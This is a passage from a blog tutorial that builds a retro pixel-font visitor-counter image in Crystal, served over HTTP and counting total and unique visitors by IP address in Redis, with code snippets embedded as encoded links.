src="https://www.techprowd.com/content/images/2020/09/image-61.png" alt=""></figure><p>Store user identifiers in Redis for uniqueness measurement and fast lookup (Remember we need speed)</p><figure><img src="https://www.techprowd.com/content/images/2020/09/source.gif" alt=""></figure><p>I found a shard (Crystal libraries are called shards) for image rendering, which can generate a PNG image using raw X, Y pixel information no external libraries used.</p><figure><a href="https://github.com/stumpycr/stumpy_png"><div><p>stumpycr/stumpy_png</p><p>Read/Write PNG images in pure Crystal. Contribute to stumpycr/stumpy_png development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>GitHub</span></p></div><p><img src="https://avatars0.githubusercontent.com/u/27729351?s=400&amp;v=4"></p></a></figure><p>For Redis client, I am going to use this shard:</p><figure><a href="https://github.com/stefanwille/crystal-redis"><div><p>stefanwille/crystal-redis</p><p>Full featured Redis client for Crystal. Contribute to stefanwille/crystal-redis development by creating an account on GitHub.</p><p><img src="https://github.githubassets.com/favicons/favicon.svg"><span>stefanwille</span><span>GitHub</span></p></div><p><img src="https://avatars2.githubusercontent.com/u/331756?s=400&amp;v=4"></p></a></figure><h2 id="step-1-rendering-image">Step 1: Rendering image</h2><p>As I have chosen image size to be 88x31, I need to try to fit two numbers. Total visits - Every load counts and Unique Visitors - Number of unique visitors.</p><p>I have drawn some sample representation I imagine in Photoshop:</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-62.png" alt=""></figure><p>It looks tiny on my 4K monitor, but back in 2005, it looked huge on my 1024x768 monitor.</p><p>One of the problems now that I am not using external libraries is that I have no simple way to render text on the image. That's not a big deal, remembering practices I used for Graphical LCD/OLED on embedded electronic projects. I will create an array of Tuples of 3 uint8 integers of each pixel information in a 7x10 array for each number.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-64.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-64.png 600w, https://www.techprowd.com/content/images/2020/09/image-64.png 800w" sizes="(min-width: 720px) 720px"></figure><p>To make each number in array format, I need to generate 7x10 images of each number. Then using the <a href="https://javl.github.io/image2cpp/">https://javl.github.io/image2cpp/</a> tool, I generated arrays for each character.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2520%2520%2520%2520ONE%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200x939393%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%2520%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ZERO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xb3b3b3%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x787879%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x939393%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x939393%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x404141%252C%25200xa4a4a4%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x787879%252C%25200x6e6f6f%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xababab%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x212222%252C%25200xababab%252C%25200x404141%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x646465%252C%25200xb3b3b3%252C%25200x939393%252C%25200xababab%252C%25200x828282%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x212222%252C%25200x4d4e4e%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D"><img src="https://www.techprowd.com/content/images/2020/09/carbon--19-.png" alt="carbon--19-"></a></p>
<!--kg-card-end: markdown--><p>Now that I have pixel data of each character, I can finally create a whole image.</p><p>Knowing the array's exact size, in our case, it's 7x10; we can loop through the array and fill in all pixels referenced from a given position.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=module%2520VisitorCounter%253A%253ACharacters%250A%2520%2520%2520%2520CHARACTER_WIDTH%2520%253D%25207%250A%2520%2520%2520%2520CHARACTER_HEIGHT%2520%253D%252010%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520TWO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x828282%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x323233%252C%25200xababab%252C%25200x212222%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x323233%252C%25200x646465%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x9b9c9c%252C%25200x404141%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x646465%252C%25200x939393%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x8b8b8b%252C%25200x787879%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x404141%252C%25200x939393%252C%25200x404141%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x9b9c9c%252C%25200x212222%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200xb3b3b3%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ONE%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x4d4e4e%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x323233%252C%25200x9b9c9c%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200x939393%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x6e6f6f%252C%25200x6e6f6f%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x0a0b0c%250A%2520%2520%2520%2520%255D%2520%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520ZERO%2520%253D%2520%255B%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x0a0b0c%252C%25200x59595a%252C%25200x6e6f6f%252C%25200x646465%252C%25200x212222%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200x787879%252C%25200xa4a4a4%252C%25200x6e6f6f%252C%25200x939393%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x0a0b0c%252C%25200xb3b3b3%252C%25200x323233%252C%25200x0a0b0c%252C%25200x0a0b0c%252C%25200xa4a4a4%252C%25200x4d4e4e%252C%2520%250A%2520%2520%2520%2520%2520%2520%2520%25200x4d4e4e%252C%25200x9b9c9c%252C%25200x0a0b0c%252C%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--20-.png" alt="carbon--20-"></a></p>
<!--kg-card-end: markdown--><p>After trying out <code>VisitorCounter::Characters.render_character</code> function I was able to see it working correctly.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-65.png" alt=""></figure><p>Now it's time to wrap it all and make the main function, which would generate and return generated image as <code>IO::Memory</code> buffer.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/carbon--21--1.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/carbon--21--1.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/carbon--21--1.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/carbon--21--1.png 1600w, https://www.techprowd.com/content/images/2020/09/carbon--21--1.png 2048w" sizes="(min-width: 720px) 720px"></figure><p>To make more usable, I added this image generator to a simple HTTP server and returned random numbers generated in response.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=require%2520%2522stumpy_png%2522%250Ainclude%2520StumpyPNG%250Arequire%2520%2522http%252Fserver%2522%250Arequire%2520%2522.%252Fvisitor_counter%252F*%2522%250A%250Aserver%2520%253D%2520HTTP%253A%253AServer.new%2520do%2520%257Ccontext%257C%250A%2520%2520context.response.content_type%2520%253D%2520%2522image%252Fpng%2522%250A%250A%2520%2520image%2520%253D%2520VisitorCounter%253A%253AImageGenerator.generate(%250A%2520%2520%2520%2520Random.new.rand(1..99999999)%252C%250A%2520%2520%2520%2520Random.new.rand(1..99999999)%252C%250A%2520%2520)%250A%250A%2520%2520context.response.content_length%2520%253D%2520image.size%250A%2520%2520IO.copy(image%252C%2520context.response)%250Aend%250A%250Aaddress%2520%253D%2520server.bind_tcp%25208080%250Aputs%2520%2522Listening%2520on%2520http%253A%252F%252F%2523%257Baddress%257D%2522%250Aserver.listen%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--22-.png" alt="carbon--22-"></a></p>
<!--kg-card-end: markdown--><p>After running this code and going to <code>http://127.0.0.1:8080</code> I received generated image with random numbers.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-66.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-66.png 600w, https://www.techprowd.com/content/images/2020/09/image-66.png 612w"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-67.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-67.png 600w, https://www.techprowd.com/content/images/2020/09/image-67.png 612w"></figure><p>Now we can move on to a more exciting part, which is counting visitors.</p><h2 id="step-2-counting-visitors">Step 2: Counting Visitors</h2><p>To count visitors first, we need some kind of unique value. In this project, I am going to use the IP address of the client. As I plan to host this on Heroku, I know that IP will only be IPv4, so I can safely convert the IP address from 127.0.0.1 to its bytes equivalent by merging all 4 x Int8 parts of IP this way it will take less space in Redis memory 4 bytes instead of 15 bytes.</p><p>This is a function which extracts IP address from request. As I mentioned before, this will be hosted on Heroku, so the client IP address will be available in the HTTP header <code>X-Forwarded-For</code> as a load balancer will replace the client IP address with its own.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=private%2520def%2520extract_ip(request)%250A%2520%2520%2520%2520ip%2520%253D%2520request.headers%255B%2522X-Forwarded-For%2522%255D%253F%250A%2520%2520%2520%2520if%2520ip.nil%253F%250A%2520%2520%2520%2520%2520%2520%2520%2520case%2520remote_address%2520%253D%2520request.remote_address%250A%2520%2520%2520%2520%2520%2520%2520%2520when%2520Socket%253A%253AIPAddress%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip%2520%253D%2520remote_address.address%250A%2520%2520%2520%2520%2520%2520%2520%2520else%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip%2520%253D%2520nil%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520unless%2520ip.nil%253F%250A%2520%2520%2520%2520%2520%2520a%252C%2520b%252C%2520c%252C%2520d%2520%253D%2520ip.split(%27.%27)%250A%250A%2520%2520%2520%2520%2520%2520ip_address%2520%253D%2520Slice(UInt8).new(4)%250A%2520%2520%2520%2520%2520%2520ip_address%255B0%255D%2520%253D%2520a.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B1%255D%2520%253D%2520b.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B2%255D%2520%253D%2520c.to_u8%250A%2520%2520%2520%2520%2520%2520ip_address%255B3%255D%2520%253D%2520d.to_u8%250A%250A%2520%2520%2520%2520%2520%2520return%2520String.new(ip_address)%250A%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520nil%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--25-.png" alt="carbon--25-"></a></p>
<!--kg-card-end: markdown--><p>If the IP address is not available for some reason, I will skip this visit from a unique visit count and just increase the total visit count.</p><p>Now wrapping everything into <code>WebHandler</code>, which will nicely integrate into HTTP Server, we should have a working counter.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=module%2520VisitorCounter%250A%2520%2520%2520%2520class%2520WebHandler%250A%2520%2520%2520%2520%2520%2520%2520%2520include%2520HTTP%253A%253AHandler%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520UNIQUE_VISITS_OFFSET_KEY%2520%253D%2520%2522UNIQUE_VISITS_OFFSET%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520TOTAL_VISITS_OFFSET_KEY%2520%253D%2520%2522TOTAL_VISITS_OFFSET%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520TOTAL_VISITS_KEY%2520%253D%2520%2522TOTAL_VISITS%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520UNIQUE_VISITS_KEY%2520%253D%2520%2522UNIQUE_VISITS%2522%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520def%2520initialize(redis%2520%253A%2520Redis%253A%253APooledClient)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis%2520%253D%2520redis%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520def%2520call(context)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.headers%255B%2522Server%2522%255D%2520%253D%2520%2522Techprowd%2520Visitor%2520Counter%2520v1.0%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520unless%2520context.request.method%2520%253D%253D%2520%2522GET%2522%2520%257C%257C%2520context.request.method%2520%253D%253D%2520%2522HEAD%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.status_code%2520%253D%2520405%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.headers.add(%2522Allow%2522%252C%2520%2522GET%252C%2520HEAD%2522)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520context.request.path.not_nil!%2520!%253D%2520%2522%252F%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520call_next(context)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520ip_address%2520%253D%2520extract_ip(context.request)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520unless%2520ip_address.nil%253F%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520increase_total_visits(ip_address)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520increase_unique_visits(ip_address)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520image%2520%253D%2520ImageGenerator.generate(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520get_total_visits()%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520get_unique_visits()%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520)%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.content_type%2520%253D%2520%2522image%252Fpng%2522%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520context.response.content_length%2520%253D%2520image.size%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520IO.copy(image%252C%2520context.response)%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520increase_total_visits(ip)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(TOTAL_VISITS_KEY).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520increase_unique_visits(ip)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2540redis.exists(ip)%2520%253D%253D%25200%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.set(ip%252C%25201)%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2540redis.incr(UNIQUE_VISITS_KEY).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520get_unique_visits%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(%2540redis.get(UNIQUE_VISITS_KEY)%2520%257C%257C%2520%25220%2522).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520private%2520def%2520get_total_visits%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(%2540redis.get(TOTAL_VISITS_KEY)%2520%257C%257C%2520%25220%2522).to_i%250A%2520%2520%2520%2520%2520%2520%2520%2520end%250A%2520%2520%2520%2520end%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--35-.png" alt="carbon--35-"></a></p>
<!--kg-card-end: markdown--><p>The main file code should look like this right now:</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=crystal&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=require%2520%2522stumpy_png%2522%250Arequire%2520%2522http%252Fserver%2522%250Arequire%2520%2522http%252Fserver%252Fhandlers%252F*%2522%250Arequire%2520%2522redis%2522%250A%250Arequire%2520%2522.%252Fvisitor_counter%252F*%2522%250A%250Ainclude%2520StumpyPNG%250A%250Amodule%2520VisitorCounter%250A%2520%2520VERSION%2520%253D%2520%25220.1.0%2522%250A%250A%2520%2520ENV%255B%2522PORT%2522%255D%2520%257C%257C%253D%2520%25228080%2522%250A%2520%2520ENV%255B%2522REDIS_URL%2522%255D%2520%257C%257C%253D%2520%2522redis%253A%252F%252F127.0.0.1%252F%2522%250A%250A%2520%2520redis%2520%253D%2520Redis%253A%253APooledClient.new(url%253A%2520ENV%255B%2522REDIS_URL%2522%255D)%250A%250A%2520%2520server%2520%253D%2520HTTP%253A%253AServer.new(%255B%250A%2520%2520%2520%2520HTTP%253A%253AErrorHandler.new%252C%250A%2520%2520%2520%2520HTTP%253A%253ALogHandler.new%252C%250A%2520%2520%2520%2520HTTP%253A%253ACompressHandler.new%252C%250A%2520%2520%2520%2520VisitorCounter%253A%253AWebHandler.new(redis)%252C%250A%2520%2520%255D)%250A%250A%2520%2520address%2520%253D%2520server.bind_tcp%2520%25220.0.0.0%2522%252CENV%255B%2522PORT%2522%255D.to_i%250A%2520%2520puts%2520%2522Listening%2520on%2520http%253A%252F%252F%2523%257Baddress%257D%2522%250A%2520%2520server.listen%250Aend"><img src="https://www.techprowd.com/content/images/2020/09/carbon--31-.png" alt="carbon--31-"></a></p>
<!--kg-card-end: markdown--><p>Running the main code now we should see the counter working as expected:</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-80.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-80.png 600w, https://www.techprowd.com/content/images/2020/09/image-80.png 801w"></figure><figure><img src="https://www.techprowd.com/content/images/2020/09/image-79.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-79.png 600w, https://www.techprowd.com/content/images/2020/09/image-79.png 612w"></figure><p>Notice the response times of the web request! It's around 1ms per request! That's crazy fast... But wait, it's not built correctly.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-81.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-81.png 600w, https://www.techprowd.com/content/images/2020/09/image-81.png 829w"></figure><p>Now that's what I call FAST!</p><figure><img src="https://www.techprowd.com/content/images/2020/09/source-1.gif" alt=""></figure><p>Just one issue... While running Apache benchmarks, I noticed that the total visit counter is increasing at every request, which is right, but it can be easily abused. We need to rate-limit the total visit counter so that a single IP address can have only one visit per X amount of time.</p><p>Easy, he said! Remember, we are using Redis for our storage, and Redis has a Keys with Expiration feature. Which is precisely what we need.</p><!--kg-card-begin: markdown--><p><a 